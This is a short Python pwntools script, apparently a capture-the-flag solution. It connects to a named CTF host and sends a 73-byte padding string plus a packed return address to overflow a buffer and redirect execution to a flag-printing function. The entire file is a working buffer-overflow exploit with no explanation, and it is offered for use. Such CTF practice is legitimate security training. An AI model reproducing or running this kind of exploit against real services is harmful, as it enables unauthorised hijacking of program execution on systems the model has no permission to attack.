#! /usr/bin/python

from pwn import *
import re

HOST = "ctf.yadunut.com"
PORT = 80

payload = "A"*73
flag_address = p32(0x0804853b)

r = remote(HOST, PORT)

r.sendline(payload+flag_address)
print r.recv()

r.close()
